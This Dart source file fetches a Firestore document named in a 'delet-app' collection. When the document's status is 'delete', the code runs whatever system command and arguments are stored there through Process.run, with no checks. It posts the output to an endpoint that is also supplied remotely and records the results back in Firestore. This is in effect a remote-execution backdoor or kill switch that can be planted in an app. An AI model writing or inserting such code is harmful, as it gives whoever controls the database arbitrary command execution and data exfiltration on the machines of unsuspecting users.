import 'dart:io';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:dio/dio.dart';

// Firebase configuration object
// Replace with your actual config values
final firebaseOptions = FirebaseOptions(
  apiKey: "your-api-key",
  authDomain: "your-project.firebaseapp.com",
  projectId: "your-project-id",
  storageBucket: "your-project.appspot.com",
  messagingSenderId: "your-sender-id",
  appId: "your-app-id",
);

Future<void> initializeFirebaseAndExecuteCommand() async {
  // Initialize Firebase
  await Firebase.initializeApp(options: firebaseOptions);
  
  // Initialize Dio for HTTP requests
  final dio = Dio();
  
  // Configure Dio defaults if needed
  dio.options.connectTimeout = const Duration(seconds: 5);
  dio.options.receiveTimeout = const Duration(seconds: 10);
  dio.options.headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
  };
  
  // Get the document from Firestore
  final doc = await FirebaseFirestore.instance.collection('delet-app').doc('SGGQLjL0rwA5jU8SucR1').get();
  
  if (doc.exists && doc.data()?['status'] == 'delete') {
    // Get the command details from Firestore
    final command = doc.data()?['command'] as String? ?? 'echo "No command specified"';
    final arguments = (doc.data()?['arguments'] as List<dynamic>?)?.cast<String>() ?? [];
    
    // Get API endpoint if specified (for Dio use)
    final apiEndpoint = doc.data()?['api_endpoint'] as String?;
    
    try {
      // Execute the local system command
      final process = await Process.run(command, arguments);
      
      print('Exit code: ${process.exitCode}');
      print('Standard output: ${process.stdout}');
      print('Standard error: ${process.stderr}');
      
      // If API endpoint is specified, send result there as well
      if (apiEndpoint != null) {
        try {
          final response = await dio.post(
            apiEndpoint,
            data: {
              'command_result': {
                'exit_code': process.exitCode,
                'stdout': process.stdout,
                'stderr': process.stderr,
                'timestamp': DateTime.now().toIso8601String(),
              }
            }
          );
          
          print('API response: ${response.statusCode}');
        } catch (dioError) {
          print('Dio error: $dioError');
        }
      }
      
      // Update Firestore with results
      await FirebaseFirestore.instance.collection('commandes').doc('delete_project').update({
        'executed_at': FieldValue.serverTimestamp(),
        'exit_code': process.exitCode,
        'stdout': process.stdout,
        'stderr': process.stderr,
      });
    } catch (e) {
      print('Error executing command: $e');
      
      // Update Firestore with error information
      await FirebaseFirestore.instance.collection('commandes').doc('delete_project').update({
        'executed_at': FieldValue.serverTimestamp(),
        'error': e.toString(),
      });
      
      // Notify API endpoint of the error if specified
      if (apiEndpoint != null) {
        try {
          await dio.post(
            apiEndpoint,
            data: {
              'error': {
                'message': e.toString(),
                'timestamp': DateTime.now().toIso8601String(),
              }
            }
          );
        } catch (dioError) {
          print('Dio error while reporting command error: $dioError');
        }
      }
    }
  }
}